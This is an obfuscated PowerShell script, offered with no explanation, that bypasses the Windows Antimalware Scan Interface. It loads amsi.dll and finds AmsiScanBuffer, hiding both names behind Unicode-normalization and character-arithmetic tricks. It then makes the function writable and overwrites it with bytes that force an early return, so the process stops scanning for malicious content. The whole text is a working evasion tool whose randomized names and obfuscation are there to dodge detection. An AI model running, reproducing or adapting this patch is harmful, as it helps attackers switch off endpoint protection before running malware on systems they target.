$hOpUKIG = @"
using System;
using System.Runtime.InteropServices;
public class hOpUKIG {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hZk0DepCbRq, string m2pQmQeWKEk7U_fu);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr c0bW89qSx6rAcrNUm, UIntPtr Je8Izcgsa, uint LPjy4, out uint pA6vNGVy);
}
"@

Add-Type $hOpUKIG

$GL9BI = [hOpUKIG]::LoadLibrary("$(('äms'+'î.d'+'ll').NORmaLIzE([chAr](70*1/1)+[CHaR](82+29)+[CHar]([bYte]0x72)+[chAR](70+39)+[CHar](24+44)) -replace [chAR](92+86-86)+[CHAr]([BYTE]0x70)+[ChAR](123)+[CHar]([bytE]0x4d)+[cHaR]([BYTe]0x6e)+[chAr](56+69))")
$xlTAPyx1bk = [hOpUKIG]::GetProcAddress($GL9BI, "$(('Á'+'m'+'s'+'î'+'S'+'c'+'á'+'n'+'B'+'ú'+'f'+'f'+'ê'+'r').nORMAlIZe([cHAr]([ByTE]0x46)+[ChAR](105+6)+[chaR]([BYTE]0x72)+[ChaR]([bYTe]0x6d)+[ChAR]([BYTe]0x44)) -replace [cHar]([BytE]0x5c)+[ChaR]([BYte]0x70)+[chaR](123*1/1)+[ChaR]([BYte]0x4d)+[cHAR](110+89-89)+[chAR](125+121-121))")
$p = 0
[hOpUKIG]::VirtualProtect($xlTAPyx1bk, [uint32]5, 0x40, [ref]$p)
$Jc7fUQ6VvUVS = "0xB8"
$TvaW5jesc7VQF = "0x57"
$OcJ = "0x00"
$y51lvq = "0x07"
$O2LGhiL2eubj = "0x80"
$TTVqOTkvsbAvowRDDA5r = "0xC3"
$FvIHuddYE = [Byte[]] ($Jc7fUQ6VvUVS,$TvaW5jesc7VQF,$OcJ,$y51lvq,+$O2LGhiL2eubj,+$TTVqOTkvsbAvowRDDA5r)
[System.Runtime.InteropServices.Marshal]::Copy($FvIHuddYE, 0, $xlTAPyx1bk, 6)